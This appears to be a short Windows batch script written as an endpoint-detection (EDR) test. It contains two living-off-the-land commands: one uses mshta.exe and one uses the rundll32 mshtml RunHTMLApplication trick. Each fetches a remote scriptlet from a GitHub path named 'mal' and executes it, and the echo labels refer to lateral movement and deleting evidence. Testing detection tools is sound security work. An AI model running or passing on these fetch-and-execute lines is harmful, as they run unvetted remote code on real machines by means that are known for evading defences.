echo EDR test powershell activity
mshta.exe javascript:a=(GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest3.sct")).Exec();close()
timeout 5
echo EDR test lateral movement and delete evidence
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/scriptsample/mal/master/edrtest2")
